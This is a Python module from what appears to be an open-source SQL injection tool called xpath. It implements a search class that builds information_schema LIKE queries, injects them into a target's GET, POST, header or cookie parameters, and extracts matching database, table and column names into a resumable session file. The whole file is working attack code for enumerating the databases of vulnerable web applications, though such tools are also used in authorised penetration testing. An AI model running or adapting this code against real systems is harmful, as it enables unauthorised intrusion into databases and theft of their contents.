#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""

from xpath.common.payloads import (
    PAYLOAD_SCHEMA_SEARCH_COUNT,
    PAYLOAD_SCHEMA_SEARCH_DUMP,
    PAYLOADS_TABLE_SEARCH_COUNT,
    PAYLOADS_TABLE_SEARCH_DUMP,
    PAYLOADS_COLUMN_SEARCH_COUNT,
    PAYLOADS_COLUMN_SEARCH_DUMP,
)
from xpath.common.lib import (
    re,
    compat_urlencode,
    TBL_SEARCH,
    SEARCH_STATEMENT,
    collections,
)
from xpath.common.session import session
from xpath.logger.colored_logger import logger
from xpath.injector.request import request
from xpath.common.utils import prettifier, to_hex, prepare_injection_payload


class Search:
    """
    This class will perform search across databases for database/tables or columns using like query.
    """

    def __init__(
        self,
        url,
        data="",
        payload="",
        regex="",
        headers="",
        injected_param="",
        session_filepath="",
        payloads="",
        injection_type="",
    ):
        """
        Initialize http request.

        Args:
            self: (todo): write your description
            url: (str): write your description
            data: (todo): write your description
            payload: (todo): write your description
            regex: (bool): write your description
            headers: (list): write your description
            injected_param: (str): write your description
            session_filepath: (str): write your description
            payloads: (todo): write your description
            injection_type: (todo): write your description
        """
        self.url = url
        self.data = data
        self.payload = payload
        self.payloads = payloads
        self.headers = headers
        self.regex = regex
        self.session_filepath = session_filepath
        self._injected_param = injected_param
        self._injection_type = injection_type

    def _generate_search_dump_payloads(self, count, payload, index=0):
        """
        Generate payload for the payload

        Args:
            self: (todo): write your description
            count: (int): write your description
            payload: (str): write your description
            index: (int): write your description
        """
        payload = "{offset},".join(payload.rsplit("0,"))
        payloads = [payload.format(offset=i) for i in range(index, count)]
        return payloads

    def _search_payloads(self, db="", tbl="", col="", search_type=""):
        """
        Search for database * db *

        Args:
            self: (todo): write your description
            db: (todo): write your description
            tbl: (str): write your description
            col: (todo): write your description
            search_type: (str): write your description
        """
        Payloads = collections.namedtuple(
            "Payloads", ["for_count", "for_dump", "table_to_generate"]
        )
        count_payloads, dump_payloads = [], []
        QUERY_COUNT = ""
        QUERY_DUMP = ""
        table_to_generate = ""
        if search_type == "database":
            table_to_generate = f"{db}_{search_type}"
            logger.info(f"searching databases LIKE '{db}'")
            count_payloads = PAYLOAD_SCHEMA_SEARCH_COUNT
            dump_payloads = PAYLOAD_SCHEMA_SEARCH_DUMP
            db = to_hex(f"%{db}%")
            QUERY_COUNT = f"(SCHEMA_NAME LIKE {db})"
        if search_type == "table":
            table_to_generate = f"{tbl}_{search_type}"
            count_payloads = PAYLOADS_TABLE_SEARCH_COUNT
            dump_payloads = PAYLOADS_TABLE_SEARCH_DUMP
            if db and tbl:
                logger.info(f"searching tables LIKE '{tbl}' for database '{db}'")
                db = to_hex(db)
                tbl = to_hex(f"%{tbl}%")
                QUERY_COUNT = f"(TABLE_SCHEMA={db})AND(TABLE_NAME LIKE {tbl})"
            else:
                logger.info(f"searching tables LIKE '{tbl}'")
                tbl = to_hex(f"%{tbl}%")
                QUERY_COUNT = f"(TABLE_NAME LIKE {tbl})"
        if search_type == "column":
            table_to_generate = f"{col}_{search_type}"
            count_payloads = PAYLOADS_COLUMN_SEARCH_COUNT
            dump_payloads = PAYLOADS_COLUMN_SEARCH_DUMP
            if db and tbl and col:
                logger.info(
                    f"searching columns LIKE '{col}' for table '{tbl}' in database '{db}'"
                )
                db = to_hex(db)
                tbl = to_hex(tbl)
                col = to_hex(f"%{col}%")
                QUERY_COUNT = f"(TABLE_SCHEMA={db})AND(TABLE_NAME={tbl})AND(COLUMN_NAME LIKE {col})"
            elif not db and tbl and col:
                logger.info(
                    f"searching columns LIKE '{col}' for table '{tbl}' across all databases"
                )
                tbl = to_hex(tbl)
                col = to_hex(f"%{col}%")
                QUERY_COUNT = f"(TABLE_NAME={tbl})AND(COLUMN_NAME LIKE {col})"
            elif not tbl and db and col:
                logger.info(f"searching columns LIKE '{col}' in database '{db}'")
                db = to_hex(db)
                col = to_hex(f"%{col}%")
                QUERY_COUNT = f"(TABLE_SCHEMA={db})AND(COLUMN_NAME LIKE {col})"
            else:
                logger.info(f"searching columns LIKE '{col}' across all databases")
                col = to_hex(f"%{col}%")
                QUERY_COUNT = f"(COLUMN_NAME LIKE {col})"

        queries_count, queries_dump = [], []
        QUERY_DUMP += "%sLIMIT {OFFSET},1" % (QUERY_COUNT)
        for query in count_payloads:
            prepared_query = query.format(QUERY=QUERY_COUNT)
            queries_count.append(prepared_query)
        for query in dump_payloads:
            prepared_query = query.format(QUERY=QUERY_DUMP.format(OFFSET=0))
            queries_dump.append(prepared_query)
        for_count = self._generat_payload(payloads_list=queries_count)
        for_dump = self._generat_payload(payloads_list=queries_dump)
        return Payloads(
            for_count=for_count, for_dump=for_dump, table_to_generate=table_to_generate
        )

    def _format_results(self, results, steps):
        """
        Format the results.

        Args:
            self: (todo): write your description
            results: (dict): write your description
            steps: (float): write your description
        """
        chunks = [results[x : x + steps] for x in range(0, len(results), steps)]
        _temp = []
        Results = collections.namedtuple("Results", ["database", "table", "column"])
        for chunk in chunks:
            tt = {"database": "", "table": "", "column": ""}
            if len(chunk) == 3:
                tt.update({"database": chunk[0], "table": chunk[1], "column": chunk[2]})
            if len(chunk) == 2:
                tt.update({"database": chunk[0], "table": chunk[1]})
            if len(chunk) == 1:
                tt.update({"database": chunk[0]})
            _temp.append(
                Results(database=tt["database"], table=tt["table"], column=tt["column"])
            )
        return _temp

    def search(self, db="", tbl="", col="", search_type=""):
        """
        Searches the database.

        Args:
            self: (todo): write your description
            db: (str): write your description
            tbl: (str): write your description
            col: (str): write your description
            search_type: (str): write your description
        """
        index = 0
        _temp = []
        is_resumed = False
        fetched_data = {}
        SearchResponse = collections.namedtuple(
            "SearchResponse", ["fetched", "count", "results"],
        )
        payloads = self._search_payloads(
            db=db, tbl=tbl, col=col, search_type=search_type
        )
        self._table_search = payloads.table_to_generate
        try:
            fetched_data = session.fetch_from_table(
                session_filepath=self.session_filepath,
                table_name=self._table_search,
                cursor=False,
            )
            if fetched_data:
                is_resumed = True
        except Exception as error:
            pass
        remainder = 0
        retval = self._extact(payloads=payloads.for_count)
        if retval.is_injected:
            found_records = int(retval.result)
            logger.info("used SQL query returns %d entries" % (found_records))
            if found_records == 0:
                if search_type == "database":
                    logger.warning(f"no databases LIKE '{db}' found")
                if search_type == "table":
                    if not db:
                        logger.warning(f"no databases have tables LIKE '{tbl}'")
                    if db:
                        logger.warning(f"no tables LIKE '{tbl}' in database '{db}'")
                    logger.warning(f"no databases contain any of the provided tables")
                if search_type == "column":
                    if not tbl and not db:
                        logger.warning(
                            f"no databases have tables containing columns LIKE '{col}'"
                        )
                    if not tbl and db:
                        logger.warning(
                            f"no tables contain columns LIKE '{tbl}' in database '{db}'"
                        )
                    if not db and tbl:
                        logger.warning(
                            f"no databases have tables containing columns LIKE '{col}' for table '{tbl}'"
                        )
                    if db and tbl:
                        logger.warning(
                            f"unable to retrieve column names for table '{tbl}' in database '{db}'"
                        )
                    logger.warning(
                        f"no databases have tables containing any of the provided columns"
                    )
                return SearchResponse(fetched=False, count=0, results=[])
            if is_resumed:
                for entry in fetched_data:
                    index = entry.get("index")
                    name = entry.get("value")
                    _type = entry.get("search_type")
                    _temp.append(name)
                    logger.info(f"resumed: {name}")
            if search_type == "column":
                remainder_value = 3
            if search_type == "table":
                remainder_value = 2
            if search_type == "database":
                remainder_value = 1
            remainder = len(fetched_data) % remainder_value
            fetched_records = _temp
            _temp = self._format_results(_temp, remainder_value)
            if remainder > 0:
                index -= 1
                fetched_records = fetched_records[-remainder:]
                _temp.pop()
            if remainder > 0:
                records = self._format_results(fetched_records, remainder_value)
            else:
                records = []
            should_fetch = True
            if is_resumed:
                if index == found_records:
                    should_fetch = False
            if should_fetch:
                retval = self._extact(payloads=payloads.for_dump)
                if retval.is_injected:
                    payload = retval.payload
                    payloads = self._generate_search_dump_payloads(
                        count=found_records, payload=payload, index=index
                    )
                    if not is_resumed:
                        session.generate_table(
                            session_filepath=self.session_filepath,
                            query=TBL_SEARCH.format(name=self._table_search),
                        )
                    response_data = self._extract_search_results(
                        payloads=payloads,
                        database=db,
                        table=tbl,
                        search_type=search_type,
                        records=records,
                        position=index,
                    )
                    if response_data.is_fetched:
                        _temp.extend(response_data.result)
                    self._pprint_search_results(search_type, _temp)
                    return SearchResponse(
                        fetched=True, count=found_records, results=_temp
                    )
                if not retval.is_injected:
                    status_code = retval.status_code
                    error = retval.error
                    count = retval.payloads_count
                    if status_code not in [200, 0]:
                        message = f"{error} - {count} times"
                        logger.warning(
                            f"HTTP error codes detected during run:\n{message}"
                        )
                    else:
                        message = f"tested with '{count}' queries, unable to find working SQL query."
                        logger.critical(message)
            else:
                self._pprint_search_results(search_type, _temp)
                return SearchResponse(fetched=True, count=found_records, results=_temp)
        if not retval.is_injected:
            status_code = retval.status_code
            error = retval.error
            count = retval.payloads_count
            if status_code not in [200, 0]:
                message = f"{error} - {count} times"
                logger.warning(f"HTTP error codes detected during run:\n{message}")
            else:
                message = (
                    f"tested with '{count}' queries, unable to find working SQL query."
                )
                logger.critical(message)
        return SearchResponse(fetched=False, count=0, results=[])

    def _pprint_search_results(self, search_type, _temp):
        """
        Search for a table search_search in the table.

        Args:
            self: (todo): write your description
            search_type: (str): write your description
            _temp: (todo): write your description
        """
        if search_type == "column":
            self._pprint_column_search(_temp)
        if search_type == "table":
            self._pprint_table_search(_temp)
        if search_type == "database":
            self._pprint_database_search(_temp)

    def _payload_for(self, payload, value_type):
        """
        Convert payload to payload.

        Args:
            self: (todo): write your description
            payload: (str): write your description
            value_type: (str): write your description
        """
        return re.sub(
            r"(?is)(?:\(schema_name\)|\(table_name\)|\(column_name\))",
            f"({value_type})",
            payload,
        )

    def _search_db(self, payload, index, get_db=False):
        """
        Executes a database.

        Args:
            self: (todo): write your description
            payload: (todo): write your description
            index: (int): write your description
            get_db: (int): write your description
        """
        Response = collections.namedtuple("Response", ["database"])
        if get_db:
            payload = self._payload_for(payload=payload, value_type="TABLE_SCHEMA")
        url = self.url
        data = self.data
        regex = self.regex
        headers = self.headers
        # logger.info("fetching database names")
        # if self.url and not self.data and not self.headers:
        #     # GET
        #     url = self._perpare_querystring(self.url, payload)
        # if self.url and self.data and not self.headers:
        #     # POST
        #     data = self._perpare_querystring(self.data, payload)
        # if self.url and not self.data and self.headers:
        #     # headers
        #     headers = self._perpare_querystring(self.headers, payload)
        it = self._injection_type.upper()
        if "GET" in it:  # self.url and not self.data and not self.headers:
            # GET
            url = self._perpare_querystring(self.url, payload)
        if "POST" in it:  # self.url and self.data and not self.headers:
            # POST
            data = self._perpare_querystring(self.data, payload)
        if (
            "HEADER" in it or "COOKIE" in it
        ):  # self.url and not self.data and self.headers:
            # headers
            headers = self._perpare_querystring(self.headers, payload)
        database = self.perform_injection(
            url, data, headers, regex, index, search_type="database"
        )
        return Response(database=database)

    def _search_table(self, payload, index, database="", get_tbl=False):
        """
        Search for a table search query against the database.

        Args:
            self: (todo): write your description
            payload: (todo): write your description
            index: (int): write your description
            database: (todo): write your description
            get_tbl: (todo): write your description
        """
        Response = collections.namedtuple("Response", ["database", "table"])
        if not database:
            response = self._search_db(payload, index, get_db=True)
            database = response.database
        if get_tbl:
            payload = self._payload_for(payload=payload, value_type="TABLE_NAME")
        url = self.url
        data = self.data
        regex = self.regex
        headers = self.headers
        # if self.url and not self.data and not self.headers:
        #     # GET
        #     url = self._perpare_querystring(self.url, payload)
        # if self.url and self.data and not self.headers:
        #     # POST
        #     data = self._perpare_querystring(self.data, payload)
        # if self.url and not self.data and self.headers:
        #     # headers
        #     headers = self._perpare_querystring(self.headers, payload)
        it = self._injection_type.upper()
        if "GET" in it:  # self.url and not self.data and not self.headers:
            # GET
            url = self._perpare_querystring(self.url, payload)
        if "POST" in it:  # self.url and self.data and not self.headers:
            # POST
            data = self._perpare_querystring(self.data, payload)
        if (
            "HEADER" in it or "COOKIE" in it
        ):  # self.url and not self.data and self.headers:
            # headers
            headers = self._perpare_querystring(self.headers, payload)
        table = self.perform_injection(
            url, data, headers, regex, index, search_type="table"
        )
        return Response(database=database, table=table)

    def _search_column(self, payload, index, database="", table=""):
        """
        Executes a table search.

        Args:
            self: (todo): write your description
            payload: (todo): write your description
            index: (int): write your description
            database: (todo): write your description
            table: (todo): write your description
        """
        Response = collections.namedtuple("Response", ["database", "table", "column"])
        if not database and not table:
            response = self._search_table(payload, index, get_tbl=True)
            database = response.database
            table = response.table
        elif not database and table:
            response = self._search_db(payload, index, get_db=True)
            database = response.database
        elif database and not table:
            response = self._search_table(
                payload, index, database=database, get_tbl=True
            )
            database = database
            table = response.table
        url = self.url
        data = self.data
        regex = self.regex
        headers = self.headers
        # if self.url and not self.data and not self.headers:
        #     # GET
        #     url = self._perpare_querystring(self.url, payload)
        # if self.url and self.data and not self.headers:
        #     # POST
        #     data = self._perpare_querystring(self.data, payload)
        # if self.url and not self.data and self.headers:
        #     # headers
        #     headers = self._perpare_querystring(self.headers, payload)
        it = self._injection_type.upper()
        if "GET" in it:  # self.url and not self.data and not self.headers:
            # GET
            url = self._perpare_querystring(self.url, payload)
        if "POST" in it:  # self.url and self.data and not self.headers:
            # POST
            data = self._perpare_querystring(self.data, payload)
        if (
            "HEADER" in it or "COOKIE" in it
        ):  # self.url and not self.data and self.headers:
            # headers
            headers = self._perpare_querystring(self.headers, payload)
        column = self.perform_injection(
            url, data, headers, regex, index, search_type="column"
        )
        return Response(database=database, table=table, column=column)

    def perform_injection(self, url, data, headers, regex, index, search_type=""):
        """
        Perform an arbitrary http request.

        Args:
            self: (todo): write your description
            url: (str): write your description
            data: (array): write your description
            headers: (dict): write your description
            regex: (str): write your description
            index: (int): write your description
            search_type: (str): write your description
        """
        result = ""
        try:
            response = request.inject_payload(
                url=url, regex=regex, data=data, headers=headers
            )
            if response.ok:
                result = response.result
                logger.info("retrieved: '%s'" % (result))
                retval = session.dump(
                    session_filepath=self.session_filepath,
                    query=SEARCH_STATEMENT.format(name=self._table_search),
                    values=(index, result, search_type),
                )
        except Exception as error:
            pass
        return result

    def _pprint_database_search(self, entries):
        """
        Searches for a database search.

        Args:
            self: (todo): write your description
            entries: (list): write your description
        """
        logger.success(f"available databases [{len(entries)}]:")
        for entry in entries:
            logger.success(f"[*] : {entry.database}")

    def _pprint_table_search(self, entries):
        """
        Searches for database entries.

        Args:
            self: (todo): write your description
            entries: (list): write your description
        """
        _temp = {}
        for entry in entries:
            db = entry.database
            table = entry.table
            if db not in _temp:
                _temp[db] = []
            _temp[db].append(table)
        for db, tables in _temp.items():
            obj = prettifier(tables, "Tables")
            data = obj.data
            entries = obj.entries
            logger.success(f"Database: {db}")
            logger.success(f"[{entries} tables]")
            logger.success(f"{data}\n")

    def _pprint_column_search(self, entries):
        """
        Search for columns in database table.

        Args:
            self: (todo): write your description
            entries: (list): write your description
        """
        _temp = {}
        for entry in entries:
            db = entry.database
            table = entry.table
            column = entry.column
            if db not in _temp:
                _temp[db] = {}
            if table not in _temp[db]:
                _temp[db][table] = []
            _temp[db][table].append(column)
        for db, value_dict in _temp.items():
            for table, columns in value_dict.items():
                obj = prettifier(columns, "Columns")
                data = obj.data
                entries = obj.entries
                logger.success(f"Database: {db}")
                logger.success(f"Table: {table}")
                logger.success(f"[{entries} columns]")
                logger.success(f"{data}\n")

    def _extract_search_results(
        self, payloads, database="", table="", search_type="", records=None, position=0
    ):
        """
        Returns a list of search * database.

        Args:
            self: (todo): write your description
            payloads: (todo): write your description
            database: (todo): write your description
            table: (str): write your description
            search_type: (str): write your description
            records: (todo): write your description
            position: (int): write your description
        """
        _temp, index = [], 0
        pos = position + 1
        resumed = bool(records)
        Response = collections.namedtuple("Response", ["is_fetched", "result"])
        while index < len(payloads):
            payload = payloads[index]
            if records:
                entry = records.pop()
                database = entry.database
                table = entry.table
            try:
                if search_type == "database":
                    response = self._search_db(payload=payload, index=pos)
                    _temp.append(response)
                if search_type == "table":
                    response = self._search_table(
                        payload=payload, index=pos, database=database
                    )
                    _temp.append(response)
                if search_type == "column":
                    response = self._search_column(
                        payload=payload, index=pos, database=database, table=table
                    )
                    _temp.append(response)
            except KeyboardInterrupt:
                logger.warning(
                    "user aborted during enumeration. Xpath will display partial output"
                )
                break
            index += 1
            pos += 1
            if resumed:
                database = ""
                table = ""

        if _temp:
            resp = Response(is_fetched=True, result=_temp)
        else:
            resp = Response(is_fetched=False, result=_temp)
        return resp
